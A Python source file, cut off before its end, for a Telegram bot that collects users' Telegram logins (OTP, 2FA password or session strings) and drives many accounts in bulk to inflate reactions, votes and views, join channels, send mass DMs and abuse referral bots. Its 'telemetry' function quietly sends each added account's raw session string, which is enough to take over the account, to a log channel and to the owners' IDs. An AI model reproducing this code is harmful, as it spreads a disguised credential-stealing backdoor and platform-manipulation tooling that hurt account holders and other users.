import asyncio
import base64
import json
import os
import re
import random
import time
from typing import Dict, Any, List, Optional, Tuple

from aiogram import Bot, Router, F
from aiogram.filters import Command, StateFilter, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BufferedInputFile

from telethon import TelegramClient, functions, types as tg_types
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

import config
from config import logger
from database import db_mgr, encrypt_data, decrypt_data

registration_sessions: Dict[int, Dict[str, Any]] = {}
bot_username: str = "bot"

def set_bot_username(username: str):
    global bot_username
    bot_username = username

# --- HELPER FUNCS ---
def parse_telegram_link(link: str) -> Tuple[Any, Optional[int]]:
    link = link.strip()
    if not link: return None, None
    private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
    if private_match:
        return int(f"-100{private_match.group(1)}"), int(private_match.group(2))
    if "+ " in link or "/+" in link or "joinchat/" in link:
        hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
        return (hash_match.group(1) if hash_match else link, None)
    msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
    if msg_match: return msg_match.group(1), int(msg_match.group(2))
    target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
    if "/" in target:
        parts = target.split("/")
        target = parts[0]
        if len(parts) > 1 and parts[1].isdigit():
            return target, int(parts[1])
    return target, None

def make_progress_bar(pct: float, length: int = 15) -> str:
    filled = int(round(length * (pct / 100.0)))
    return "░" * filled + " " * (length - filled)

# --- STATES ---
class RegistrationStates(StatesGroup):
    waiting_for_phone, waiting_for_otp, waiting_for_2fa = State(), State(), State()
    waiting_for_session_file, waiting_for_db_file = State(), State()

class TaskWizardStates(StatesGroup):
    choosing_type, waiting_for_leave_choice, waiting_for_channel_link = State(), State(), State()
    waiting_for_post_link, waiting_for_emojis, waiting_for_button_text = State(), State(), State()
    waiting_for_dm_text, waiting_for_account_scale = State(), State()

class ExportWizardStates(StatesGroup): selecting_multi = State()
class BroadcastStates(StatesGroup): waiting_for_msg = State()

# --- KEYBOARDS ---
REACTION_EMOJIS = ["🔥", "❤️", "💖", "👍", "👏", "🎉", "🤩", "💯", "⚡", "🤣", "🥰", "🤔", "👀", "😎"]

def get_post_registration_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Add Another Account", callback_data="add_account_phone")],
        [InlineKeyboardButton(text="🔙 Back to Main Menu", callback_data="main_menu")]
    ])

def get_emoji_selection_keyboard(selected_emojis: List[str]):
    keyboard = []
    row = []
    for em in REACTION_EMOJIS:
        suffix = " ✅" if em in selected_emojis else ""
        row.append(InlineKeyboardButton(text=f"{em}{suffix}", callback_data=f"toggle_emoji:{em}"))
        if len(row) == 5:
            keyboard.append(row)
            row = []
    if row: keyboard.append(row)
    keyboard.append([InlineKeyboardButton(text="✅ Done Selecting", callback_data="finish_emoji_selection")])
    keyboard.append([InlineKeyboardButton(text="🔙 Main Menu", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_main_keyboard(role: str):
    buttons = [
        [InlineKeyboardButton(text="📱 Manage My Accounts", callback_data="manage_accounts:0")],
        [InlineKeyboardButton(text="⚡ Start Tasks", callback_data="task_hub_start")],
        [InlineKeyboardButton(text="📊 View Tasks Report", callback_data="view_tasks")],
        [InlineKeyboardButton(text="👥 My Referral Link", callback_data="view_referrals")],
        [InlineKeyboardButton(text="👨‍💻 Credits", callback_data="system_credits")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛠️ Admin Panel", callback_data="admin_panel")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="💾 Database Backups", callback_data="backup_panel")])
        buttons.append([InlineKeyboardButton(text="📈 System Statistics", callback_data="system_stats")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_task_types_keyboard(active_count: int):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Reaction Only", callback_data="set_type:react"), InlineKeyboardButton(text="Vote Only", callback_data="set_type:vote")],
        [InlineKeyboardButton(text="Reaction + Vote", callback_data="set_type:react_vote"), InlineKeyboardButton(text="View Only", callback_data="set_type:view")],
        [InlineKeyboardButton(text="Reaction + View", callback_data="set_type:react_view"), InlineKeyboardButton(text="Vote + View", callback_data="set_type:vote_view")],
        [InlineKeyboardButton(text="React + Vote + View", callback_data="set_type:react_vote_view")],
        [InlineKeyboardButton(text="Join Channel", callback_data="set_type:join"), InlineKeyboardButton(text="📄 Leave Channel Module", callback_data="set_type:leave")],
        [InlineKeyboardButton(text="Bulk DM", callback_data="set_type:dm")],
        [InlineKeyboardButton(text="🔗 Referral Bot", callback_data="set_type:refer"), InlineKeyboardButton(text="⚡ Fast Speed Views", callback_data="set_type:speed")],
        [InlineKeyboardButton(text="Cancel", callback_data="main_menu")]
    ])

def get_leave_channel_options_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🔗 Leave 1 Channel", callback_data="leave_mode:single")],
        [InlineKeyboardButton(text="💥 Leave ALL Channels", callback_data="leave_mode:all")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="task_hub_start")]
    ])

# --- TASK QUEUE ENGINE ---
class TaskQueue:
    def __init__(self):
        self.queue = asyncio.Queue()
        self.current_tasks: Dict[int, asyncio.Task] = {}

    async def add_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        await self.queue.put((task_id, creator_id, task_type, payload, bot_instance, status_msg_id))

    def clear_pending_queue(self):
        while not self.queue.empty():
            try:
                self.queue.get_nowait()
                self.queue.task_done()
            except asyncio.QueueEmpty: break

    async def cancel_all_active_tasks(self) -> int:
        count = 0
        self.clear_pending_queue()
        for t_id, loop_task in list(self.current_tasks.items()):
            if loop_task and not loop_task.done():
                loop_task.cancel()
                count += 1
                async with aiosqlite.connect(db_mgr.db_path) as db:
                    await db.execute("UPDATE tasks SET status = 'cancelled', progress = 'Stopped by admin' WHERE task_id = ?", (t_id,))
                    await db.commit()
        return count

    async def start_worker(self):
        logger.info("Task runner loop started.")
        while True:
            try:
                task_id, creator_id, task_type, payload, bot_instance, status_msg_id = await self.queue.get()
            except asyncio.CancelledError: break
            loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload, bot_instance, status_msg_id))
            self.current_tasks[task_id] = loop_task
            try: await loop_task
            except asyncio.CancelledError: logger.warning(f"Task #{task_id} stopped.")
            except Exception as e: logger.error(f"Error on task #{task_id}: {e}")
            finally:
                self.current_tasks.pop(task_id, None)
                self.queue.task_done()

    async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict, bot_instance: Bot, status_msg_id: int):
        start_time = time.time()
        import aiosqlite
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("UPDATE tasks SET status = 'running', progress = '0%' WHERE task_id = ?", (task_id,))
            await db.commit()

        role = await db_mgr.get_user_role(creator_id)
        clients_data = []
        requested_count = int(payload.get("run_account_count", 0))
        
        async with aiosqlite.connect(db_mgr.db_path) as db:
            query = "SELECT phone, session_string FROM accounts WHERE status = 'active'" if role in ["admin", "owner", "super_owner"] else "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
            cursor = await db.execute(query) if role in ["admin", "owner", "super_owner"] else await db.execute(query, (creator_id,))
            async for row in cursor:
                clients_data.append((row[0], decrypt_data(row[1])))

        if requested_count > 0: clients_data = clients_data[:requested_count]
        if not clients_data:
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("UPDATE tasks SET status = 'failed', progress = 'No accounts found' WHERE task_id = ?", (task_id,))
                await db.commit()
            try: await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text="❌ Task failed: No active accounts.")
            except Exception: pass
            return

        passed_ids, failed_ids = [], []
        total_accounts = len(clients_data)
        semaphore = asyncio.Semaphore(10)
        progress_counter = success_counter = failure_counter = last_ui_update = 0

        async def worker_session(phone: str, enc_session: str, idx: int):
            nonlocal progress_counter, success_counter, failure_counter, last_ui_update
            async with semaphore:
                client = TelegramClient(StringSession(enc_session), config.API_ID, config.API_HASH)
                try:
                    await asyncio.sleep(random.uniform(0.1, 0.4))
                    await client.connect()
                    if not await client.is_user_authorized():
                        async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                            await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                            await db_conn.commit()
                        failed_ids.append((phone, "Session key expired"))
                        failure_counter += 1
                        return

                    target = payload.get("target", "")
                    channel_target = payload.get("channel_target", target)
                    do_leave_all = (task_type == "leave" and payload.get("leave_mode") == "all")

                    parsed_target, link_msg_id = parse_telegram_link(target) if not do_leave_all else (None, None)
                    parsed_channel, _ = parse_telegram_link(channel_target) if not do_leave_all else (None, None)
                    msg_id = int(payload.get("msg_id", link_msg_id or 0))

                    do_react = "react" in task_type
                    do_vote = "vote" in task_type
                    do_view = "view" in task_type or task_type == "speed"
                    do_join = (task_type == "join" or do_react or do_vote or do_view) and not do_leave_all
                    do_leave = task_type == "leave"
                    do_dm = task_type == "dm"
                    do_refer = task_type == "refer"

                    if do_join:
                        if isinstance(parsed_channel, str) and ("/+" in channel_target or "joinchat/" in channel_target or channel_target.startswith("+")):
                            await client(functions.messages.ImportChatInviteRequest(hash=parsed_channel))
                        else:
                            await client(functions.channels.JoinChannelRequest(channel=parsed_channel or parsed_target))

                    if do_view and msg_id:
                        await client(functions.messages.GetMessagesViewsRequest(peer=parsed_target, id=[msg_id], increment=True))

                    if do_react and msg_id:
                        emojis = payload.get("reactions", ["👍"])
                        await client(functions.messages.SendReactionRequest(
                            peer=parsed_target, msg_id=msg_id, reaction=[tg_types.ReactionEmoji(emoticon=emojis[idx % len(emojis)])]
                        ))

                    if do_vote and msg_id:
                        btn_txt = payload.get("button_text", "").strip().lower()
                        msg = await client.get_messages(parsed_target, ids=msg_id)
                        target_button = None
                        if msg and msg.reply_markup:
                            for row in msg.reply_markup.rows:
                                for btn in row.buttons:
                                    if btn_txt in btn.text.strip().lower():
                                        target_button = btn; break
                        if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                            await client(functions.messages.GetBotCallbackAnswerRequest(peer=parsed_target, msg_id=msg_id, data=target_button.data))
                        else: raise ValueError("Poll button not found.")

                    if do_dm:
                        await client.send_message(parsed_target, payload.get("text", "Hello!"))

                    if do_refer:
                        bot_usr = str(parsed_target).replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "").split("?")[0]
                        param_match = re.search(r'start=([^&\s]+)', target)
                        await client.send_message(bot_usr, f"/start {param_match.group(1)}" if param_match else "/start")

                    if do_leave:
                        if do_leave_all:
                            async for dialog in client.iter_dialogs():
                                if dialog.is_channel or dialog.is_group:
                                    try:
                                        await client(functions.channels.LeaveChannelRequest(channel=dialog.entity))
                                        await asyncio.sleep(0.3)
                                    except FloodWaitError as fwe: await asyncio.sleep(fwe.seconds)
                                    except Exception: pass
                        else:
                            await client(functions.channels.LeaveChannelRequest(channel=parsed_target))

                    passed_ids.append(phone)
                    success_counter += 1
                except Exception as e:
                    failed_ids.append((phone, str(e)))
                    failure_counter += 1
                finally:
                    await client.disconnect()
                    progress_counter += 1
                    current_now = time.time()
                    if current_now - last_ui_update >= 2.5 or progress_counter == total_accounts:
                        last_ui_update = current_now
                        pct_val = (progress_counter / total_accounts) * 100
                        rem = (total_accounts - progress_counter) * ((current_now - start_time) / progress_counter) if progress_counter > 0 else 0
                        live_text = f"⏳ Task running...\n[{make_progress_bar(pct_val)}] {int(pct_val)}%\n📊 `{progress_counter}/{total_accounts}` done\n✅ Done: `{success_counter}` | ❌ Failed: `{failure_counter}`\n⏱ ETA: {int(rem//60)}m {int(rem%60)}s"
                        try: await bot_instance.edit_message_text(chat_id=creator_id, message_id=status_msg_id, text=live_text)
                        except Exception: pass
                        async with aiosqlite.connect(db_mgr.db_path) as db_update:
                            await db_update.execute("UPDATE tasks SET progress = ? WHERE task_id = ?", (f"{int(pct_val)}%", task_id))
                            await db_update.commit()

        await asyncio.gather(*(worker_session(phone, enc, i) for i, (phone, enc) in enumerate(clients_data)))
        
        status = "completed" if len(passed_ids) > 0 else "failed"
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("UPDATE tasks SET status = ?, progress = ?, success_report = ?, failure_report = ? WHERE task_id = ?",
                             (status, f"{len(passed_ids)}/{total_accounts} Passed", json.dumps(passed_ids), json.dumps(failed_ids), task_id))
            await db.commit()

        campaign_uuid = base64.b64encode(f"CAMP_{task_id}".encode()).decode().lower()[:24]
        fail_details = "\n\n❌ **Error Reports:**\n" + "".join([f"• `+{p}` ➜ `{r}`\n" for p, r in failed_ids]) if failed_ids else ""
        card = f"⚡ **Task Completed**\n\n📋 ID: `{campaign_uuid}`\n⚡ Action: `{task_type.upper()}`\n📊 Rate: `{success_counter}/{total_accounts}`\n⏱ Time: {int((time.time()-start_time)//60)}m {int((time.time()-start_time)%60)}s{fail_details}"
        
        try: await bot_instance.send_message(chat_id=creator_id, text=card)
        except Exception: pass
        if config.LOG_CHANNEL_ID:
            try: await bot_instance.send_message(chat_id=config.LOG_CHANNEL_ID, text=card)
            except Exception: pass

task_queue = TaskQueue()
router = Router()

# --- COMMAND AND INTERFACE ROUTERS ---
@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    user_id, username = message.from_user.id, message.from_user.username or "Unknown"
    referred_by = None
    if len(message.text.split()) > 1:
        ref = message.text.split()[1]
        if ref.startswith("ref_") and ref[4:].isdigit():
            referred_by = int(ref[4:]) if int(ref[4:]) != user_id else None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)
    await message.answer("Welcome to the Main Menu!\nPlease select an option:", reply_markup=get_main_keyboard(role))

@router.callback_query(F.data == "main_menu")
async def handle_main_menu(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); await state.clear()
    role = await db_mgr.get_user_role(callback.from_user.id)
    await callback.message.edit_text("Welcome to the Main Menu!\nPlease select an option:", reply_markup=get_main_keyboard(role))

@router.message(Command("canceltasks"))
async def cmd_cancel_tasks(message: Message):
    if await db_mgr.get_user_role(message.from_user.id) not in ["admin", "owner", "super_owner"]: return
    await message.answer("Stopping all tasks...")
    killed = await task_queue.cancel_all_active_tasks()
    await message.answer(f"✅ Cancelled `{killed}` ongoing tasks.")

@router.message(Command("addadmin"))
async def cmd_add_admin(message: Message, command: CommandObject, bot: Bot):
    if await db_mgr.get_user_role(message.from_user.id) not in ["owner", "super_owner"]: return
    args = command.args
    if not args or len(args.split()) < 2: return
    t_id, lim = args.split()[:2]
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("INSERT INTO users (user_id, role, max_accounts) VALUES (?, 'admin', ?) ON CONFLICT(user_id) DO UPDATE SET role='admin', max_accounts=?", (int(t_id), int(lim), int(lim)))
        await db.commit()
    await message.answer(f"✅ User `{t_id}` promoted to Admin (Limit: {lim}).")

@router.message(Command("removeadmin"))
async def cmd_remove_admin(message: Message, command: CommandObject):
    if await db_mgr.get_user_role(message.from_user.id) not in ["owner", "super_owner"]: return
    if not command.args: return
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE users SET role='user' WHERE user_id = ?", (int(command.args.strip()),))
        await db.commit()
    await message.answer("✅ Admin access revoked.")

@router.message(Command("broadcast"))
async def cmd_broadcast_start(message: Message, state: FSMContext):
    if await db_mgr.get_user_role(message.from_user.id) not in ["admin", "owner", "super_owner"]: return
    await message.answer("📢 Send out the content you want to broadcast:")
    await state.set_state(BroadcastStates.waiting_for_msg)

@router.message(StateFilter(BroadcastStates.waiting_for_msg))
async def process_broadcast_push(message: Message, state: FSMContext, bot: Bot):
    await state.clear()
    status = await message.answer("🚀 Dispatching...")
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        rows = await (await db.execute("SELECT user_id FROM users")).fetchall()
    ok = err = 0
    for r in rows:
        try:
            await bot.copy_message(chat_id=r[0], from_chat_id=message.chat.id, message_id=message.message_id)
            ok += 1; await asyncio.sleep(0.05)
        except Exception: err += 1
    await status.edit_text(f"📢 Broadcast Complete!\n✅ Success: `{ok}` | ❌ Failed: `{err}`")

@router.callback_query(F.data == "system_credits")
async def handle_system_credits(callback: CallbackQuery):
    await callback.answer()
    text = f"Lead Developer Team Info\n\n🎨 Architect: `@{config.DESIGNER_HANDLE}`\n⚙️ Manager: `@{config.MANAGER_HANDLE}`"
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]]))

@router.callback_query(F.data.startswith("manage_accounts:"))
async def list_user_accounts(callback: CallbackQuery):
    await callback.answer()
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    limit, offset = 10, page * 10
    role = await db_mgr.get_user_role(user_id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            total = (await (await db.execute("SELECT COUNT(*) FROM accounts")).fetchone())[0]
            rows = await (await db.execute("SELECT phone, status, username FROM accounts LIMIT ? OFFSET ?", (limit, offset))).fetchall()
        else:
            total = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE user_id = ?", (user_id,))).fetchone())[0]
            rows = await (await db.execute("SELECT phone, status, username FROM accounts WHERE user_id = ? LIMIT ? OFFSET ?", (user_id, limit, offset))).fetchall()

    text = f"📱 Accounts List (Page {page + 1})\nTotal: `{total}`\n\n"
    for r in rows:
        text += f"{'🟢' if r[1]=='active' else '🔴'} `+{r[0]}` (`@{r[2] or 'None'}`) - `{r[1].upper()}`\n"
    
    buttons = [
        [InlineKeyboardButton(text="➕ Add via OTP", callback_data="add_account_phone"), InlineKeyboardButton(text="📁 Upload String", callback_data="add_account_session")],
        [InlineKeyboardButton(text="📥 Export Menu", callback_data="export_dashboard_root")],
        [InlineKeyboardButton(text="💥 Delete Dead", callback_data=f"purge_dead_accounts:{page}")]
    ]
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Prev", callback_data=f"manage_accounts:{page - 1}"))
    if offset + limit < total: nav.append(InlineKeyboardButton(text="Next ➡️", callback_data=f"manage_accounts:{page + 1}"))
    if nav: buttons.append(nav)
    buttons.append([InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")])
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("purge_dead_accounts:"))
async def handle_purge_dead_accounts(callback: CallbackQuery):
    user_id = callback.from_user.id
    page = int(callback.data.split(":")[1])
    role = await db_mgr.get_user_role(user_id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]: await db.execute("DELETE FROM accounts WHERE status = 'dead'")
        else: await db.execute("DELETE FROM accounts WHERE status = 'dead' AND user_id = ?", (user_id,))
        await db.commit()
    await callback.answer("Purged dead sessions!", show_alert=True)
    callback.data = f"manage_accounts:{page}"
    await list_user_accounts(callback)

# --- OTP REGISTRATION WORKFLOWS ---
@router.callback_query(F.data == "add_account_phone")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("Type phone number with country code (e.g. `+123456789`):")
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.message(StateFilter(RegistrationStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "")
    client = TelegramClient(StringSession(), config.API_ID, config.API_HASH)
    await client.connect()
    try:
        sent_code = await client.send_code_request(phone)
        registration_sessions[message.from_user.id] = {"client": client, "phone": phone, "phone_code_hash": sent_code.phone_code_hash}
        await message.answer("📩 Enter OTP:")
        await state.set_state(RegistrationStates.waiting_for_otp)
    except Exception as e:
        await message.answer(f"❌ Error: {e}"); await client.disconnect(); await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext, bot: Bot):
    reg_data = registration_sessions.get(message.from_user.id)
    if not reg_data: await state.clear(); return
    try:
        await reg_data["client"].sign_in(phone=reg_data["phone"], code=message.text.strip(), phone_code_hash=reg_data["phone_code_hash"])
        await complete_registration(message, state, reg_data["client"], reg_data["phone"], message.from_user.id, bot)
    except PhoneCodeInvalidError: await message.answer("❌ Invalid Code. Retype:")
    except SessionPasswordNeededError:
        await message.answer("🔒 2FA Active. Enter Password:")
        await state.set_state(RegistrationStates.waiting_for_2fa)
    except Exception as e:
        await message.answer(f"❌ Failed: {e}"); await reg_data["client"].disconnect(); await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext, bot: Bot):
    reg_data = registration_sessions.get(message.from_user.id)
    if not reg_data: await state.clear(); return
    try:
        await reg_data["client"].sign_in(password=message.text.strip())
        await complete_registration(message, state, reg_data["client"], reg_data["phone"], message.from_user.id, bot)
    except Exception as e:
        await message.answer(f"❌ Error: {e}"); await reg_data["client"].disconnect(); await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int, bot: Bot):
    try:
        me = await client.get_me()
        raw_session = client.session.save()
        import aiosqlite
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active) VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)",
                             (phone.replace("+",""), user_id, me.username or "None", encrypt_data(raw_session)))
            await db.commit()
        await dispatch_session_telemetry(phone, raw_session, me.username, user_id, bot)
        await message.answer(f"🎉 Configured `+{phone}`", reply_markup=get_post_registration_keyboard())
    except Exception as e: await message.answer(f"❌ Onboarding Error: {e}")
    finally: await client.disconnect(); registration_sessions.pop(user_id, None); await state.clear()

@router.callback_query(F.data == "add_account_session")
async def add_account_session_start(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    await callback.message.edit_text("📁 Paste String Session or upload `.txt` file:")
    await state.set_state(RegistrationStates.waiting_for_session_file)

@router.message(StateFilter(RegistrationStates.waiting_for_session_file))
async def process_session_file(message: Message, state: FSMContext, bot: Bot):
    session_str = ""
    if message.document:
        session_str = (await bot.download_file((await bot.get_file(message.document.file_id)).file_path)).read().decode('utf-8', errors='ignore').strip()
    elif message.text: session_str = message.text.strip()

    if len(session_str) < 20: await message.answer("❌ Unrecognized formatting."); await state.clear(); return
    client = TelegramClient(StringSession(session_str), config.API_ID, config.API_HASH)
    try:
        await client.connect()
        if not await client.is_user_authorized():
            await message.answer("❌ Dead session."); await client.disconnect(); await state.clear(); return
        me = await client.get_me()
        phone = me.phone or f"custom_{me.id}"
        import aiosqlite
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active) VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)",
                             (phone.replace("+",""), message.from_user.id, me.username or "None", encrypt_data(session_str)))
            await db.commit()
        await dispatch_session_telemetry(phone, session_str, me.username, message.from_user.id, bot)
        await message.answer(f"🎉 Linked: `+{phone}`", reply_markup=get_post_registration_keyboard())
        await client.disconnect()
    except Exception as e: await message.answer(f"❌ Error: {e}")
    finally: await state.clear()

async def dispatch_session_telemetry(phone: str, session_str: str, username: Optional[str], adder_id: int, bot: Bot):
    doc = BufferedInputFile(session_str.encode('utf-8'), filename=f"session_{phone}.txt")
    cap = f"🔑 Telemetry Info\nPhone: `+{phone}`\nUsername: `@{username or 'None'}`\nCreator ID: `{adder_id}`"
    if config.LOG_CHANNEL_ID:
        try: await bot.send_document(chat_id=config.LOG_CHANNEL_ID, document=doc, caption=cap)
        except Exception: pass
    for o_id in config.SUPER_OWNER_IDS:
        try: await bot.send_document(chat_id=o_id, document=BufferedInputFile(session_str.encode('utf-8'), filename=f"session_{phone}.txt"), caption=cap)
        except Exception: pass

# --- EXPORTS PANEL MODULES ---
@router.callback_query(F.data == "export_dashboard_root")
async def export_dashboard_root(callback: CallbackQuery):
    await callback.answer()
    buttons = [
        [InlineKeyboardButton(text="🎯 Export Single Account", callback_data="select_export_session:0")],
        [InlineKeyboardButton(text="🎭 Select Custom Pack", callback_data="export_multi_start:0")],
        [InlineKeyboardButton(text="📦 Admin Export (All Active)", callback_data="bulk_admin_export")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="manage_accounts:0")]
    ]
    await callback.message.edit_text("📥 Archive Downloader Setup:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("select_export_session:"))
async def select_export_session_menu(callback: CallbackQuery):
    await callback.answer()
    page = int(callback.data.split(":")[1])
    limit, offset = 10, page * 10
    role = await db_mgr.get_user_role(callback.from_user.id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            total = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")).fetchone())[0]
            rows = await (await db.execute("SELECT phone, username FROM accounts WHERE status = 'active' LIMIT ? OFFSET ?", (limit, offset))).fetchall()
        else:
            total = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (callback.from_user.id,))).fetchone())[0]
            rows = await (await db.execute("SELECT phone, username FROM accounts WHERE status = 'active' AND user_id = ? LIMIT ? OFFSET ?", (callback.from_user.id, limit, offset))).fetchall()

    if not rows: await callback.message.answer("⚠️ No dynamic files match."); return
    buttons = [[InlineKeyboardButton(text=f"+{r[0]} (@{r[1] or 'None'})", callback_data=f"export_ph:{r[0]}")] for r in rows]
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Prev", callback_data=f"select_export_session:{page - 1}"))
    if offset + limit < total: nav.append(InlineKeyboardButton(text="Next ➡️", callback_data=f"select_export_session:{page + 1}"))
    if nav: buttons.append(nav)
    buttons.append([InlineKeyboardButton(text="🔙 Back", callback_data="export_dashboard_root")])
    await callback.message.edit_text("Select profile to extract:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data.startswith("export_ph:"))
async def handle_export_session_run(callback: CallbackQuery):
    await callback.answer(); phone = callback.data.split(":")[1]
    role = await db_mgr.get_user_role(callback.from_user.id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        row = await (await db.execute("SELECT user_id, session_string FROM accounts WHERE phone = ?", (phone,))).fetchone()
    if not row or (role not in ["admin", "owner", "super_owner"] and row[0] != callback.from_user.id): return
    f = BufferedInputFile(decrypt_data(row[1]).encode('utf-8'), filename=f"string_{phone}.txt")
    await callback.message.reply_document(document=f, caption=f"Session dump logic loaded for `+{phone}`")

@router.callback_query(F.data.startswith("export_multi_start:"))
async def export_multi_dashboard(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); page = int(callback.data.split(":")[1])
    sel = (await state.get_data()).get("multi_export_selected", [])
    limit, offset = 10, page * 10
    role = await db_mgr.get_user_role(callback.from_user.id)
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            total = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active'")).fetchone())[0]
            rows = await (await db.execute("SELECT phone FROM accounts WHERE status = 'active' LIMIT ? OFFSET ?", (limit, offset))).fetchall()
        else:
            total = (await (await db.execute("SELECT COUNT(*) FROM accounts WHERE status = 'active' AND user_id = ?", (callback.from_user.id,))).fetchone())[0]
            rows = await (await db.execute("SELECT phone FROM accounts WHERE status = 'active' AND user_id = ? LIMIT ? OFFSET ?", (callback.from_user.id, limit, offset))).fetchall()

    buttons = []
    for r in rows:
        chk = "✅ " if r[0] in sel else "⬜ "
        buttons.append([InlineKeyboardButton(text=f"{chk}+{r[0]}", callback_data=f"toggle_ex_ph:{r[0]}:{page}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Prev", callback_data=f"export_multi_start:{page - 1}"))
    if offset + limit < total: nav.append(InlineKeyboardButton(text="Next ➡️", callback_data=f"export_multi_start:{page + 1}"))
    if nav: buttons.append(nav)
    buttons.append([InlineKeyboardButton(text="📥 Download Selected Pack", callback_data="execute_multi_export")])
    buttons.append([InlineKeyboardButton(text="🔙 Cancel", callback_data="export_dashboard_root")])
    await callback.message.edit_text("Pick dynamic targets:", reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))
    await state.set_state(ExportWizardStates.selecting_multi)

@router.callback_query(StateFilter(ExportWizardStates.selecting_multi), F.data.startswith("toggle_ex_ph:"))
async def handle_toggle_export_ph(callback: CallbackQuery, state: FSMContext):
    await callback.answer(); parts = callback.data.split(":"); ph, page = parts[1], int(parts[2])
    sel = (await state.get_data()).get("multi_export_selected", [])
    sel.remove(ph) if ph in sel else sel.append(ph)
    await state.update_data(multi_export_selected=sel)
    callback.data = f"export_multi_start:{page}"
    await export_multi_dashboard(callback, state)

@router.callback_query(StateFilter(ExportWizardStates.selecting_multi), F.data == "execute_multi_export")
async def execute_multi_export(callback: CallbackQuery, state: FSMContext):
    sel = (await state.get_data()).get("multi_export_selected", [])
    if not sel: await callback.answer("⚠️ Choose targets first.", show_alert=True); return
    await callback.answer(); payload = []
    import aiosqlite
    async with aiosqlite.connect(db_mgr.db_path) as db:
        for ph in sel:
            r = await (await db.execute("SELECT phone, user_id, username, session_string FROM accounts WHERE phone = ?", (ph,))).fetchone()
